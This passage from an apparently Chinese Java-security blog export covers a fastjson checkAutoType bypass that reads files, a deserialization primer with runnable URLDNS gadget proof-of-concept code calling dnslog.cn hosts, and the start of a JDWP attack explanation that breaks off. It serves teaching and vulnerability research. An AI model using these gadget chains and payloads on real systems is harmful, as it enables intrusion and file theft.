<p><img src="/images/20230531203048.png"></p>
<p>调用<code>cast</code>会返回对应的代理对象，无法通过上面的方法将<code>ICompilationUnit</code> put 进<code>this.deserializer</code>。</p>
<p><img src="/images/20230531203417.png"></p>
<p>jsonStr1 中不添加<code>newAnnotationProcessorUnits</code>参数，它的作用是把<code>SourceTypeCollisionException</code>添加进<code>mapping</code>，以便后面使用。</p>
<p><code>MiscCodec.deserialze()</code>中调用了<code>toJavaObject()</code>，可以把数组类型的参数转换成 Java 对象，然后把该参数类型 put 进<code>this.deserializer</code>；<br><code>MapDeserializer.deserialze()</code>可以把传入的各参数的值赋给对应的对象；</p>
<p>jsonStr2 中 各类对应的<code>deserializer</code>如下：</p>
<table>
<thead>
<tr>
<th>Class</th>
<th>deserializer</th>
</tr>
</thead>
<tbody><tr>
<td>java.lang.Class</td>
<td>MiscCodec</td>
</tr>
<tr>
<td>com.alibaba.fastjson.JSONObject</td>
<td>MapDeserializer</td>
</tr>
</tbody></table>
<p>jsonStr2 的作用就是将<code>org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit</code>类型 put 进<code>this.deserializer</code>；  </p>
<p>jsonStr3 的作用就是利用<code>BasicCompilationUnit</code>类中的<code>getContents()</code>方法来读取文件内容；<br><code>&quot;x&quot;:&#123;&#125;</code>的作用是将<code>BasicCompilationUnit</code>对象序列化为 JSON 数据</p>
<p>调试分析：</p>
<p>jsonStr1通过期望类绕过<code>checkAutoType()</code>，并调用 <code>TypeUtils.addMapping</code>将<code>org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException</code>保存进<code>mapping</code></p>
<p><img src="/images/20230531204554.png"></p>
<p>开始对jsonStr2反序列化，<code>java.lang.Class</code>在<code>mappings</code>中，通过<code>checkAutoType</code></p>
<p><img src="/images/20230531204759.png"></p>
<p>获取反序列器为<code>MiscCodec</code>，调用<code>MiscCodec.deserialze</code></p>
<p><img src="/images/20230531204954.png"></p>
<p><code>MiscCodec.deserialze</code>中调用<code>parser.parse()</code>-&gt;<code>parseObject(object, fieldName)</code>，其中获取到@type的值为<code>JSONObject</code>后会绕过<code>checkAutoType</code></p>
<p><img src="/images/20230531210053.png"></p>
<p>然后获取<code>JSONObject</code>的解析器<code>MapDeserializer</code>,调用<code>MapDeserializer.deserialze</code></p>
<p><img src="/images/20230531211015.png"></p>
<p>获取到<code>java.lang.String</code>，然后调用<code>StringCode.deserialze()</code>，返回<code>@type</code></p>
<p><img src="/images/20230531211114.png"></p>
<p>将后面两个参数放入map中</p>
<p><img src="/images/20230531211348.png"><br><img src="/images/20230531211603.png"></p>
<p>返回到<code>MiscDeserializer</code>，调用<code>jsonObject.toJavaObject</code>，</p>
<p><img src="/images/20230531211920.png"></p>
<p>跟进<code>toJavaObject()</code> -&gt; <code>TypeUtils.cast()</code> -&gt; <code>cast()</code> -&gt; <code>castToJavaBean()</code>，获取<code>SourceTypeCollisionException</code>带入<code>checkAutoType()</code>，从<code>mapping</code>中获取并返回 clazz；<br>然后又调用<code>castToJavaBean()</code>；</p>
<p><img src="/images/20230531213322.png"></p>
<p>之后在创建实例的时候会去解析里面的参数，跟进<code>createInstance()</code>，获取到<code>ICompilationUnit[]</code>类型的参数<code>newAnnotationProcessorUnits</code>，调用<code>parseField()</code> -&gt; <code>getFieldValueDeserilizer()</code> -&gt; <code>getDeserializer()</code>，得到<code>ObjectArrayCode</code>类型的<code>deserializer</code>，这里的<code>type</code>是带<code>[L...;</code>字符的；<br><img src="/images/20230531213659.png"></p>
<p>调用<code>ObjectArrayCode.deserialize()</code>，获取到<code>interface org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit</code>，带入<code>parseArray()</code>，<code>getDeserializer()</code>将<code>ICompilationUnit</code>接口类型的<code>deserializer</code> put 进<code>this.deserializer</code>。</p>
<p><img src="/images/20230531214228.png"></p>
<p>然后在<code>parser.close()</code>-&gt;<code>lexer.close()</code>，关闭的时候会因为没有闭合抛出异常，进入catch</p>
<p><img src="/images/20230531214544.png"></p>
<p>然后开始解析第三个序列化字符串，因为<code>org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit</code>已经put进<code>deserializers</code>，成功绕过<code>checkAutoType</code></p>
<p><img src="/images/20230531214712.png"></p>
<p>之后获取解析器，调用deserialze，<code>ICompilationUnit</code>作为期望类绕过<code>BasicCompilationUnit</code>的<code>checkAutoType</code>。</p>
<p><img src="/images/20230531215003.png"></p>
<p>继续获取解析器，调用deserialze，解析参数放入params，调用有参构造</p>
<p><img src="/images/20230531215218.png"></p>
<p>有参构造中调用父类的构造器，将参数写入fileName属性中</p>
<p><img src="/images/20230531215438.png"></p>
<p>最后得到<code>JsonObject</code>对象后返回，<code>println()</code>会调用<code>JsonObject</code>对象的<code>toString</code>方法，调用<code>valueOf</code>-&gt;<code>toString()</code>-&gt;<code>toJSONString()</code>-&gt;<code>write(Object object)</code>-&gt;<code>MapSerializer#write</code>-&gt;<code>preWriter.write</code></p>
<p><img src="/images/20230531224654.png"></p>
<p>在方法中会序列化所有的属性，当序列化<code>contents</code>属性时，调用<code>getContents</code>方法</p>
<p><img src="/images/20230531224749.png"></p>
<p><code>getContents()</code>方法中会调用<code>getFileCharContent</code>，在参数中new了File对象传入</p>
<p><img src="/images/20230531225037.png"></p>
<p><code>getFileCharContent</code>方法中，新建了文件输入流，读取文件中的内容</p>
<p><img src="/images/20230531225313.png"></p>
<p>最后得到返回值，写入流中。</p>
<p><img src="/images/20230531225602.png"></p>
<h1 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h1><ol>
<li>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</li>
<li>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</li>
</ol>
<p>第一种需要使用Feature才能触发</p>
<pre><code>new Feature[]&#123;Feature.SupportNonPublicField&#125;
</code></pre>
<p>第二种用到的是BCEL字节码然后使用classload进行加载。</p>
<p>第二个链：<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">P牛BCEL ClassLoader去哪里了</a></p>
<p>大佬分析得很详细，有时间自己再总结下</p>
<h1 id="AutoType深入理解"><a href="#AutoType深入理解" class="headerlink" title="AutoType深入理解"></a>AutoType深入理解</h1><p><strong>fastjson为什么要引入AutoType？</strong></p>
<p>假设我们有下面这个Java类：</p>
<pre><code>class Store &#123;

    private String name;

    private Fruit fruit;

    public String getName() &#123;

    return name;

    &#125;

    public void setName(String name) &#123;

    this.name = name;

    &#125;

    public Fruit getFruit() &#123;

    return fruit;

    &#125;

    public void setFruit(Fruit fruit) &#123;

    this.fruit = fruit;

    &#125;

&#125;

interface Fruit &#123;

&#125;

class Apple implements Fruit &#123;

    private BigDecimal price;

&#125;
</code></pre>
<p>当我们对它进行序列化时，Fastjson会扫描其中的Getter方法，即找到getName和getFruit，这时就会将Name和Fruit两个字段的值序列化到JSON字符串中。</p>
<p>那么问题来了，<strong>上面定义的Fruit只是一个接口，序列化的时候Fastjson能将属性值正确序列化出来吗？</strong> 如果可以的话，反序列的时候，Fastjson会把这个Fruit反序列化成什么类型呢？</p>
<pre><code>Store store = new Store();

store.setName(&quot;Hollis&quot;);

Apple apple = new Apple();

apple.setPrice(new BigDecimal(0.5));

store.setFruit(apple);

String jsonString = JSON.toJSONString(store);

System.out.println(&quot;toJSONString : &quot; + jsonString);
</code></pre>
<p>创建了一个store，为它指定了名称，并创建了Fruit的子类型Apple，然后将store用JSON.toJSONString进行序列化，可以得到以下JSON内容：</p>
<pre><code>toJSONString : &#123;

&quot;fruit&quot;:&#123;

&quot;price&quot;:0.5

&#125;

,&quot;name&quot;:&quot;Hollis&quot;

&#125;
</code></pre>
<p>Fruit的类型是什么呢，能否反序列化为Apple呢？</p>
<pre><code>Store newStore = JSON.parseObject(jsonString, Store.class);

System.out.println(&quot;parseObject : &quot; + newStore);

Apple newApple = (Apple)newStore.getFruit();

System.out.println(&quot;getFruit : &quot; + newApple);
</code></pre>
<p>执行结果如下：</p>
<pre><code>toJSONString : &#123;

&quot;fruit&quot;:&#123;

&quot;price&quot;:0.5

&#125;

,&quot;name&quot;:&quot;Hollis&quot;

&#125;

parseObject : Store&#123;

name=&#39;Hollis&#39;, fruit=&#123;&#125;&#125;

Exception in thread &quot;main&quot; java.lang.ClassCastException: com.hollis.lab.fastjson.test.$Proxy0 cannot be cast to com.hollis.lab.fastjson.test.Apple

at com.hollis.lab.fastjson.test.FastJsonTest.main(FastJsonTest.java:26)
</code></pre>
<p>在将store反序列化后，我们尝试将Fruit转换成Apple，但抛出了异常。因为fastjson在反序列化的时候也不知道这个接口要反序列成哪个实现类。</p>
<blockquote>
<p>使用Fastjson进行序列化，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。</p>
</blockquote>
<p>如何解决这个问题呢？Fastjson引入了AutoType，在序列化时，把原始类型记录下来。使用方法是通过<code>SerializerFeature.WriteClassName</code>进行标记，即将上述代码中的：</p>
<pre><code>String jsonString = JSON.toJSONString(store);
</code></pre>
<p>修改为：</p>
<pre><code>String jsonString = JSON.toJSONString(store,SerializerFeature.WriteClassName);
</code></pre>
<p>修改后的代码输出结果如下：</p>
<pre><code>System.out.println(&quot;toJSONString : &quot; + jsonString);

&#123;

&quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Store&quot;,

&quot;fruit&quot;:&#123;

&quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Apple&quot;,

&quot;price&quot;:0.5

&#125;

,

&quot;name&quot;:&quot;Hollis&quot;

&#125;
</code></pre>
<p><strong>使用SerializerFeature.WriteClassName进行标记后，JSON字符串中多出了一个@type字段，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型。</strong></p>
<p>这时再将这个序列化的数据反序列化就能拿到实现类的数据类型了。</p>
<p>这就是Fastjson中引入AutoType的原因，但是也正因为这个特性，才有后面的checkAutoType，以及一系列的黑名单绕过。</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化基础</title>
    <url>/2023/03/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="序列化与反序列化概念"><a href="#序列化与反序列化概念" class="headerlink" title="序列化与反序列化概念"></a>序列化与反序列化概念</h1><p>在 Java 中的序列化与反序列化，就是将一个 Java 对象当前状态以字符串（字节序列）的形式描述出来，这串字符可能被储存&#x2F;发送到任何需要的位置，在适当的时候，再将它转回原本的 Java 对象。</p>
<p>这中间需要一个规则，规则中描述了序列化和反序列化时究竟该如何把一个对象处理成字符串，又如何把字符串变回对象，因为这一过程必须是可逆的。</p>
<p>Java 提供了两个类 <code>java.io.ObjectOutputStream</code> 和 <code>java.io.ObjectInputStream</code> 来实现序列化和反序列化的功能，其中 ObjectInputStream 用于恢复那些已经被序列化的对象，ObjectOutputStream 将 Java 对象的原始数据类型和图形写入 OutputStream。</p>
<p>在 Java 的类中，必须要实现 <code>java.io.Serializable</code> 或 <code>java.io.Externalizable</code> 接口才可以使用，而实际上 Externalizable 也是实现了 Serializable 接口。</p>
<h2 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h2><p>ObjectOutputStream 继承的父类或实现的接口如下：</p>
<ul>
<li>父类 OutputStream：所有字节输出流的顶级父类，用来接收输出的字节并发送到某些接收器（sink）。</li>
<li>接口 ObjectOutput：ObjectOutput 扩展了 DataOutput 接口，DataOutput 接口提供了将数据从任何 Java 基本类型转换为字节序列并写入二进制流的功能，ObjectOutput 在 DataOutput 接口基础上提供了 <code>writeObject</code> 方法，也就是类（Object）的写入。</li>
<li>接口 ObjectStreamConstants：定义了一些在对象序列化时写入的常量。常见的一些的比如 <code>STREAM_MAGIC</code>、<code>STREAM_VERSION</code> 等。</li>
</ul>
<h2 id="ObjectInputStream"><a href="#ObjectInputStream" class="headerlink" title="ObjectInputStream"></a>ObjectInputStream</h2><p>ObjectInputStream 继承的父类或实现的接口如下：</p>
<ul>
<li>父类 InputStream：所有字节输入流的顶级父类。</li>
<li>接口 ObjectInput：ObjectInput 扩展了 DataInput 接口，DataInput 接口提供了从二进制流读取字节并将其重新转换为 Java 基础类型的功能，ObjectInput 额外提供了 <code>readObject</code> 方法用来读取类。</li>
<li>接口 ObjectStreamConstants：同上。</li>
</ul>
<p>ObjectInputStream 实现了反序列化功能，看一下其中的关键方法。</p>
<h3 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h3><p>从 ObjectInputStream 读取一个对象，将会读取对象的类、类的签名、类的非 transient 和非 static 字段的值，以及其所有父类类型。</p>
<p>我们可以使用 <code>writeObject</code> 和 <code>readObject</code> 方法为一个类重写默认的反序列化执行方，所以其中 <code>readObject</code> 方法会 “传递性” 的执行，也就是说，在反序列化过程中，会调用反序列化类的 <code>readObject</code> 方法，以完整的重新生成这个类的对象。</p>
<p>#反序列化漏洞</p>
<p>在前面提到过，一个类想要实现序列化和反序列化，必须要实现 <code>java.io.Serializable</code> 或 <code>java.io.Externalizable</code> 接口。</p>
<p>Serializable 接口是一个标记接口，标记了这个类可以被序列化和反序列化，而 Externalizable 接口在 Serializable 接口基础上，又提供了 <code>writeExternal</code> 和 <code>readExternal</code> 方法，用来序列化和反序列化一些外部元素。</p>
<p>其中，如果被序列化的类重写了 writeObject 和 readObject 方法，Java 将会委托使用这两个方法来进行序列化和反序列化的操作。</p>
<p>正是因为这个特性，导致反序列化漏洞的出现：在反序列化一个类时，如果其重写了 <code>readObject</code> 方法，程序将会调用它，如果这个方法中存在一些恶意的调用，则会对应用程序造成危害。</p>
<p>##为什么会执行readObject呢？</p>
<p>来到<code>java.io.ObjectInputStream#readObject(java.lang.Class&lt;?&gt;)</code></p>
<p><img src="/images/20230424205256.png"></p>
<p><code>readObject</code>方法会调用<code>readObject0</code>方法</p>
<p><img src="/images/20230424205507.png"></p>
<p><code>readObject0</code>方法以字节的方式去读，当读到<code>0x73</code>，代表这是一个对象的序列化数据，将会调用 <code>readOrdinaryObject</code> 方法进行处理</p>
<p><img src="/images/20230424205943.png"></p>
<p><code>readOrdinaryObject</code>中会判断类是否实现了 Externalizable 接口，如果是，执行<code>readExternalData</code> 方法，不过不是，执行 <code>readSerialData</code> 方法去调用类中的<code>readObject</code> 方法。</p>
<p><img src="/images/20230424210302.png"></p>
<p><code>readSerialData</code> 方法先通过<code>hasReadObjectMethod</code>判断对象是否重写<code>readObject</code> 方法，如果是， 执行<code>invokeReadObject</code> 方法调用对象中的 <code>readObject</code>。</p>
<p>序列化触发原理同理，但是一般实际环境不会去主动序列化不可信的来源。</p>
<p>##Gadget概念</p>
<p>一个能成功执行的反序列化调用链需要三个元素：</p>
<ul>
<li><strong>kick-off</strong> 入口点（重写了 readObject 的类）</li>
<li><strong>sink</strong> （最终执行恶意动作的点：RCE…）</li>
<li><strong>chain</strong> （中间的调用链）</li>
</ul>
<p>#从URLDNS理解反序列化</p>
<p>URLDNS只依赖原生类，没有 jdk 版本限制，也被 ysoserial 涵盖在其中,所以非常适合新手来理解反序列化。它不会执行命令，只会触发 DNS 解析，因此通常用来探测是否存在反序列化漏洞.</p>
<p>这个漏洞关键点是 Java 内置的 <code>java.net.URL</code> 类，这个类的 <code>equals</code> 和 <code>hashCode</code> 方法具有一个有趣的特性：在对 URL 对象进行比较时（使用 <code>equals</code> 方法或 <code>hashCode</code> 方法），会触发一次 DNS 解析，因为对于 URL 来说，如果两个主机名（host）都可以解析为相同的 IP 地址，则这两个主机会被认为是相同的（sink）。</p>
<p>##<code>equals</code>方法解析</p>
<p><code>URL#equals</code> 方法重写了 Object 的判断，调用 <code>URLStreamHandler#equals</code> 方法进行判断：<br><img src="/images/20230425112129.png"></p>
<p><code>URLStreamHandler#equals</code> 方法判断 URL 对象是否相同，并调用 <code>sameFile</code> 方法比较两个 URL，看它们是否引用了相同的 protocol(协议)、host(主机)、port(端口)、path(路径)。</p>
<p><img src="/images/20230425112552.png"></p>
<p><code>sameFile</code> 方法在比较 host(主机)时，调用 <code>hostsEqual</code> 方法进行比较。</p>
<p><img src="/images/20230425112607.png"></p>
<p><code>hostsEqual</code> 方法调用 <code>getHostAddress</code> 方法对要比较的两个 URL 进行请求解析 IP 地址，并实施对比。</p>
<p><img src="/images/20230425112641.png"></p>
<p><code>getHostAddress</code> 方法使用 <code>InetAddress.getByName()</code> 方法对 host 进行解析，触发了 DNS 请求。</p>
<p>##<code>hashCode</code>方法解析</p>
<p><code>hashcode</code>代表对象的地址说的是对象在<strong>hash表</strong>中的位置，当在散列存储结构中确定对象的存储地址时，就会调用对象的<code>hashcode</code>方法，比如<code>HashMap</code>。URL 的 <code>hashCode</code> 方法也进行了重写，调用了 <code>URLStreamHandler#hashCode</code> 方法。在此之前有一个判断，那就是 <code>hashCode != -1</code>。</p>
<p><img src="/images/20230425113832.png"></p>
<p>同样是调用了 <code>getHostAddress</code> 方法对 URL 的 host 进行了解析。</p>
<p><img src="/images/20230425113902.png"></p>
<p>无论是使用 <code>equals</code> 方法，还是使用 <code>hashCode</code> 方法，应用程序都会解析DNS，这就是漏洞的 <strong>sink</strong> 点。</p>
<p>接下来寻找<strong>kick-off</strong> 入口点，谁重写了<code>readObject</code>，并且<code>readObject</code>还会调用<code>equals</code>或<code>hashCode</code>方法， 那就是URLDNS gadget 的主角 —— <code>java.util.HashMap</code>。<br>HashMap的原理可以看<a href="https://cloud.tencent.com/developer/article/1167574">这篇文章</a>。</p>
<p>我们直接看到HashMap 的 <code>readObject</code> 方法，可以看到，在<code>putVal</code>的时候会调用<code>hash</code>方法计算key对象的hash值</p>
<p><img src="/images/20230425114513.png"></p>
<p><code>hash</code>方法中，如果key不为空，就会调用key的<code>hashCode</code>方法,如果我们在key中传入url对象就触发DNS解析。</p>
<p><img src="/images/20230425114637.png"></p>
<p>这个逻辑就是 URLDNS 这条反序列化利用的 gadget 的基本原理，接下来我们测试一下，有两个需要注意的点是：</p>
<ul>
<li>想要让HashMap的key中有值，就需要调用HashMap的<code>put</code>方法去放入key&#x2F;value，在使用 HashMap 的 <code>put</code> 方法时，也是调用 <code>putVal</code> 方法，会对 key 进行 hash，触发解析。如果我们不想在生成 payload 时触发 DNS 解析，就要使用反射将值放进去。</li>
<li>URL 对象有一个属性 hashCode，默认是 -1，使用<code>hashCode</code> 方法计算时会在 hashCode 属性中缓存已经计算过的值，如果再次计算将直接返回值，不会在触发 URLStreamHandler 的 <code>hashCode</code> 方法，也就不会触发漏洞。所以我们需要在生成的 HashMap 中的 URL 参数的 hashCode 值在反序列化时为 -1，而刚才说过，如果使用 put 方法，会调用一次 key 的 hash 计算，也就是 URL 的 <code>hashCode</code> 方法，这样就把 hashCode 缓存了，在反序列化时就不会触发 URLStreamHandler 的 <code>hashCode</code> 方法以及后面的逻辑。</li>
</ul>
<p>所以有两种思路解决这个问题：</p>
<ul>
<li>如果使用 HashMap 的 <code>put</code> 方法，将 URL 对象放入 Map 的 key 中之前，先将其 URL 对象 hashCode 进行修改，使其不等于 -1，这样就不会触发 DNS 查询，放入之后，再使用反射将 URL 对象中的 hashCode 修改为 -1，反序列化的时候就可以正常触发了。</li>
<li>直接反射调用 HashMap 的 <code>putVal</code> 方法绕过 hash 计算。（由于 JDK 1.7 中方法名不一样，细节也不一样，所以不具有通用性）</li>
</ul>
<p>第一种思路</p>
<pre><code>    public class URLDNS1 &#123;

    public static void main(String[] args) throws Exception &#123;

        HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;();
        URL url = new URL(&quot;http://lmz3mb.dnslog.cn&quot;);
        Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
        field.setAccessible(true);

        field.set(url, 0x01010101);
        hashMap.put(url, 0);
        field.set(url, -1);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns.bin&quot;));
        oos.writeObject(hashMap);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns.bin&quot;));
        ois.readObject();
    &#125;
&#125;
</code></pre>
<p>第二种思路：</p>
<pre><code>public class URLDNS2 &#123;

    public static void main(String[] args) throws Exception &#123;

        HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;();
        URL                   url     = new URL(&quot;http://su18.dnslog.cn&quot;);

        Method[] m = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredMethods();
        for (Method method : m) &#123;
            if (method.getName().equals(&quot;putVal&quot;)) &#123;
                method.setAccessible(true);
                method.invoke(hashMap, -1, url, 0, false, true);
            &#125;
        &#125;

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;urldns2.bin&quot;));
        oos.writeObject(hashMap);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;urldns2.bin&quot;));
        ois.readObject();
    &#125;
&#125;
</code></pre>
<p>以上两种都可以触发DNS查询</p>
<p>##ysoserial实现</p>
<pre><code>public class URLDNS implements ObjectPayload&lt;Object&gt; &#123;

        public Object getObject(final String url) throws Exception &#123;

                //Avoid DNS resolution during payload creation
                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        &#125;

        public static void main(final String[] args) throws Exception &#123;
                PayloadRunner.run(URLDNS.class, args);
        &#125;

        /**
        * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
        * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
        * using the serialized object.&lt;/p&gt;
        *
        * &lt;b&gt;Potential false negative:&lt;/b&gt;
        * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
        * second resolution.&lt;/p&gt;
        */
        static class SilentURLStreamHandler extends URLStreamHandler &#123;

                protected URLConnection openConnection(URL u) throws IOException &#123;
                        return null;
                &#125;

                protected synchronized InetAddress getHostAddress(URL u) &#123;
                        return null;
                &#125;
        &#125;
&#125;
</code></pre>
<p> ysoserial的方法是：自定义了SilentURLStreamHandler扩展了 URLStreamHandler ，让<code>getHostAddress</code>和<code>openConnection</code>方法返回空，在初始化 URL 对象时传入，当调用HashMap的<code>put</code>方法触发hash值计算时，url对象对调用我们自定义的<code>getHostAddress</code>返回空，这样就不会触发 DNS 查询，然后在<code>put</code> 之后则是通过反射将 URL 对象的 hashCode 的值重新改为 -1。</p>
<p>需要注意的是，为什么目标在反序列化时不会调用我们自定义的<code>getHostAddress</code>方法呢？</p>
<p>在URL类中的<code>handler</code>属性前有个关键字<code>transient</code>,可以自定义在序列化时，把哪些属性不写入字节序列中。所以在反序列化时，目标还是会执行dns请求。</p>
<pre><code>transient URLStreamHandler handler;
</code></pre>
<p>通过ysoserial的方法编写我们的测试demo：</p>
<pre><code>public class URLDNS3 &#123;

    static class SilentURLStreamHandler extends URLStreamHandler implements Serializable&#123;

        protected URLConnection openConnection(URL u) throws IOException &#123;
            return null;
        &#125;

        protected synchronized InetAddress getHostAddress(URL u) &#123;
            return null;
        &#125;
    &#125;

    public static void main(String[] args) throws Exception &#123;

        URLStreamHandler      handler = new SilentURLStreamHandler();
        HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;();
        URL                   url     = new URL(null, &quot;http://m7ful0.dnslog.cn&quot;, handler);
        hashMap.put(url, 0);

        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
        f.setAccessible(true);
        f.set(url, -1);


        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns3.bin&quot;));
        oos.writeObject(hashMap);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns3.bin&quot;));
        ois.readObject();
    &#125;
&#125;
</code></pre>
<p>以上就是 URLDNS 分析的全部内容了，最后总结一下。</p>
<ol>
<li>利用说明：</li>
</ol>
<ul>
<li>通过 HashMap 的反序列化调用 URL 的 hashCode 方法发起 DNS 查询，通常用来检测反序列化漏洞的存在。</li>
</ul>
<ol start="2">
<li>Gadget 总结：</li>
</ol>
<ul>
<li>kick-off gadget：java.util.HashMap#readObject()</li>
<li>sink gadget：java.net.URL#hashCode()</li>
<li>chain gadget：无</li>
</ul>
<ol start="3">
<li>优点：</li>
</ol>
<ul>
<li>使用java内部的类进行构造，不依赖第三方库</li>
<li>如果目标可以出网，在目标没有回显的时候，可以用来验证是否存在反序列化漏洞</li>
</ul>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>JDWP攻击原理分析</title>
    <url>/2023/06/08/JDWP/</url>
    <content><![CDATA[<h1 id="JDWP协议"><a href="#JDWP协议" class="headerlink" title="JDWP协议"></a>JDWP协议</h1><p>JDWP（Java Debug Wire Protocol Transport Interface）协议是用于调试器（debugger）和被调试的Java虚拟机（Target VM）之前的通信协议。如果一个应用在本地调试没出问题，而在线上出现了问题，就可以开启JDWP远程调试来解决问题，然后就有可能被利用。</p>
<p><img src="/images/20230608131742.png"></p>
<p>JDWP是一个基于二进制包的网络协议。<br>JDWP大致分为两个阶段：握手（handshake）和应答。</p>
<p><img src="/images/20230608131759.png"></p>
<p>握手结束后，Debugger就可以向Target VM发送命令了。JDWP是通过命令包（command packet）和回复包（reply packet）来进行通信的。JDWP本身是无状态的，因此对命令出现的顺序并不受限制。</p>
<p>Debugger通过命令包获取Target VM 的信息以及控制程序的执行，Target VM通过发送命令包通知Debugger某些事件的发生，如到达断点或是产生异常。回复包是用来回复命令包的，表示该命令是否执行成功。如果执行成功，回复包还可能包含有命令包请求的数据，如变量的值等。而从Target VM发出的命令包是不需要回复的。</p>
<p>JDWP是异步的，不需要等待接收到前一个命令包的回复包就可以发送下一个命令包。</p>
<h1 id="JPDA"><a href="#JPDA" class="headerlink" title="JPDA"></a>JPDA</h1><p>JPDA（Java Platform Debugger Architecture）：即Java平台调试体系架构。Java虚拟机设计的专门的API接口供调试和监控虚拟机使用。</p>
<p>JPDA按照抽象层次，又分为三层，分别是：</p>
<ul>
<li>JVM TI（Java VM Tool Interface）：虚拟机对外暴露的接口，包括debug和profile。</li>
<li>JDI（Java Debug Interface）：Java库接口，实现了JDWP协议的客户端，调试器可以用来和远程被调试应用通信。</li>
<li>JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息，在调试Android应用程序这一场景中，Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB，而 Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART），JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。</li>
</ul>
<h1 id="JDWP通信格式"><a href="#JDWP通信格式" class="headerlink" title="JDWP通信格式"></a>JDWP通信格式</h1><p><img src="/images/20230608131905.png"></p>
<p><code>id</code>和<code>length</code>的含义非常简单。<code>flag</code>字段用于表明是请求包还是返回包，如果<code>flag</code>是<code>0x80</code>就表示一个返回包。<code>CommandSet</code>定义了<code>Command</code>的类别。</p>
<ul>
<li><code>0x40</code>,JVM的行为，例如打断点;</li>
<li><code>0x40–0x7F</code>，当运行到断点处，JVM需要进行进一步的操作;</li>
<li><code>0x80</code>，第三方扩展;</li>
</ul>
<h2 id="JDWP关键方法"><a href="#JDWP关键方法" class="headerlink" title="JDWP关键方法"></a>JDWP关键方法</h2><ol>
<li><code>VirtualMachine/IDSizes</code> 确定了能够被JVM处理的数据包的大小.</li>
<li><code>ClassType/InvokeMethod</code> 允许你唤起一个静态函数</li>
<li><code>ObjectReference/InvokeMethod</code> 、允许你唤起JVM中一个实例化对象的方法;</li>
<li><code>StackFrame/(Get|Set)</code> 提供了线程堆栈的pushing&#x2F;popping的功能;</li>
<li><code>Event/Composite</code>强制JVM执行此命令的行为，此命令是调试需要的密钥。这个事件能够要求JVM按照其意愿设置断点，单步调试，以及类似与像GDB或者WinGDB的方式一样进行调试。JDWP提供了内置命令来将任意类加载到JVM内存中并调用已经存在和&#x2F;或新加载的字节码。</li>
</ol>
<p>对应脚本jdwp-shellifier的运行过程：</p>
<ol>
<li>与Target VM 握手，建立连接</li>
<li>向JVM发出请求获取IDSizes</li>
<li>向JVM发出请求获取JVM的版本信息</li>
<li>向JVM发出请求获取所有的类信息，其中包含有referenceTypeID</li>
</ol>
<p><img src="/images/20230608132813.png"></p>
<ol start="5">
<li><p>从得到的类信息中提取出java.lang.Runtime类的referenceTypeID</p>
</li>
<li><p>由于Runtime类只能通过getRuntime方法获取，因此还需要向服务器请求获取方法信息</p>
</li>
</ol>
<p><img src="/images/20230608132835.png"></p>
<ol start="7">
